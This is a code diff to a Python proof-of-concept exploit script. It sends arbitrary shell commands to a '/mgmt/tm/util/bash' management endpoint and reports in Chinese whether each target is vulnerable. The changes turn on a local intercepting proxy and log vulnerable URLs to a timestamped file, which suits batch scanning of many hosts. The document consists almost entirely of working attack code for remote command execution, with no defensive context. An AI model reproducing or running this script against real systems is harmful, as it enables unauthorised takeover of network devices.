@@ -3,9 +3,11 @@ import json
 import argparse
 import re
 import json
+import time
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
+t = int(time.time())
 
 def poc_1(target_url, command):
     print(target_url)
@@ -17,19 +19,26 @@ def poc_1(target_url, command):
     }
 
     data = json.dumps({'command': 'run' , 'utilCmdArgs': '-c ' + command})
-    # proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
     check_url = target_url + '/mgmt/tm/util/bash'
     try:
-        r = requests.post(url=check_url, data=data, headers=headers, verify=False, timeout=20)
+        r = requests.post(url=check_url, data=data, headers=headers, verify=False, timeout=20, proxies=proxies)
         if r.status_code == 200 and 'commandResult' in r.text:
             default = json.loads(r.text)
             display = default['commandResult']
+            save_file(target_url, t)
             print('[+] 存在漏洞 {0}'.format(target_url))
             print('$ > {0}'.format(display))
         else:
             print('[-] 不存在漏洞')        
     except Exception as e:
         print('url 访问异常 {0}'.format(target_url))
+
+def save_file(target_url, t):
+    output_name = 'Output_{0}.txt'.format(t)
+    f = open(output_name, 'a')
+    f.write(target_url + '\n')
+    f.close()
 
 def format_url(url):
     try:
@@ -50,6 +59,8 @@ def main():
     url = args.url
     file = args.file
     command = args.command
+
+
 
     if not url is None:
         target_url = format_url(url)
